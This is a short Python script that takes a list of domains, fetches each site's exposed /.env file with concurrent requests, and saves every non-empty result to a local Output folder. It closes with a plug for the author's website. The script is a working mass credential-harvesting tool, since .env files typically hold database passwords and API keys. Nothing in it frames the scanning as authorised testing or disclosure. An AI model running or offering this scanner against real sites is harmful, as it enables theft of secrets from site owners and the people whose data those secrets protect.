import os
import re
import requests
import time
from concurrent.futures import ThreadPoolExecutor

processed_urls = set()

def check_url(url):
    if url in processed_urls:
        return
    processed_urls.add(url)
    domain = re.search("(?P<domain>[\w-]+\.[\w-]+)", url).group("domain")
    env_url = url + "/.env"
    start_time = time.time()
    try:
        response = requests.get(env_url)
    except requests.exceptions.RequestException as e:
        print(f"Could not connect to {env_url}")
        return
    download_time = time.time() - start_time
    print("Checking URL: " + env_url)
    if response.ok:
        if response.status_code != 404:
            if download_time < 5:
                output_folder = "Output/"
                if not os.path.exists(output_folder):
                    os.makedirs(output_folder)
                if (
                    response.headers.get("content-type") == "text/plain"
                    or response.headers.get("content-type") is None
                ):
                    if response.text:
                        with open(output_folder + domain + ".txt", "w") as f:
                            f.write(response.text)
                        print(f"Saved .env file for {domain}")
                    else:
                        print(f"Skipping {domain} because the .env file is empty")
                elif response.headers.get("content-type") == "application/octet-stream":
                    if response.content:
                        with open(output_folder + domain + ".txt", "wb") as f:
                            f.write(response.content)
                        print(f"Downloaded .env file for {domain}")
                    else:
                        print(f"Skipping {domain} because the .env file is empty")
                else:
                    print(f"Skipping {domain} because the .env file is empty")
            else:
                print(
                    f"Skipping {domain} because it took more than 5 seconds to download"
                )
        else:
            print(f"Skipping {domain} because the page is a 404 page")
    else:
        print(f"No .env file found for {domain}")

with open("domains.txt", "r") as f:
    urls = [line.strip() for line in f]

with ThreadPoolExecutor() as executor:
    executor.map(check_url, urls)

print("Don't forget to check out my website https://thesentinel.black <3")